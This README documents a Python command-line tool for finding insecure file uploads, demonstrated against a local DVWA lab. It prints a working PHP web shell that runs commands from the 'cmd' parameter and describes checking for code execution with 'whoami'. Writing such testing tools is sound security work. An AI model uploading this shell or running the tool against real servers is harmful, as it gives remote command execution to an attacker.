# File Upload Vulnerability Tester (CLI Tool)

## 📝 Overview
This is a simple yet effective CLI tool built in Python to detect **insecure file upload vulnerabilities** in web applications. It simulates the upload of a payload (like `shell.php`) to a target URL and checks if the file is accessible and potentially executable.

Useful for:
- Bug bounty hunters
- Web application testers
- CTF learners
- Anyone practicing ethical hacking

## 📁 Repository Structure
```
file-upload-vuln-tester/
├── upload_tester.py          # Main CLI tool
├── shell.php                 # Sample test payload
├── requirements.txt          # Required Python packages
├── README.md                 # Project documentation
├── screenshots/              # Proof of exploitation
│   ├── tool_run.png
│   ├── browser_rce.png
│   └── dvwa_form.png
```

## ⚙️ Requirements
- Python 3.x
- requests

Install dependencies:
```bash
pip install -r requirements.txt
```

## 🚀 Usage
```bash
python3 upload_tester.py <upload_url> <file_path> --base <base_url>
```

### Example:
```bash
python3 upload_tester.py http://localhost/DVWA/vulnerabilities/upload/ shell.php --base http://localhost/DVWA/hackable/
```


## 🧠 How It Works
1. Sends a POST request with a test file
2. Checks common upload folders for the file (uploads/, files/, etc.)
3. Verifies file access and optional RCE using `?cmd=whoami`

## 🔐 Sample Payload (shell.php)
```php
<?php
if(isset($_REQUEST['cmd'])){
  system($_REQUEST['cmd']);
}
?>
```
> Upload this to simulate a remote shell

## 💡 Why This Project?
- Helps automate a real-world vulnerability test
- Trains for bug bounty methodology
- Demonstrates scripting and scanning skills

## 🛡️ Disclaimer
This tool is for **educational and ethical testing only**. Do not use it on systems you do not own or have explicit permission to test.

## 👨‍💻 Author
[Your Name Here]
Feel free to connect with me on LinkedIn or contribute to the tool!

## 📜 License
MIT License
